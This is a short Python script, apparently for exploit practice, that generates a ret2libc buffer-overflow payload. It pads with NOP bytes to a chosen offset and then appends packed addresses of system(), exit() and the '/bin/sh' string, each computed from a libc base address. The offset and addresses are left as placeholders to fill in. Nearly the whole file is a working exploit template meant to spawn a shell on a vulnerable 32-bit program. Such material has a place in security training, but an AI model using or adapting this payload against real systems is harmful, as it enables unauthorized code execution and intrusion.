#!/usr/bin/python3
"""
Author: BlackSkull
Web: https://blackskull.gitbook.io/blackskull
"""
from struct import pack

print("*********************************************")
print("*                                           *")
print("*       RET2LIBC PAYLOAD GENERATOR          *")
print("*                                           *")
print("*********************************************")
print()
print()

offset = #here
junk = b"\x90"*offset

base_libc_addr = #here
system_addr_off = #here
exit_addr_off = #here
bin_sh_addr_off = #here

system_addr = pack("<L", base_libc_addr + system_addr_off)
exit_addr = pack("<L", base_libc_addr + exit_addr_off)
bin_sh_addr = pack("<L", base_libc_addr + bin_sh_addr_off)

payload = junk + system_addr + exit_addr + bin_sh_addr

print (payload)
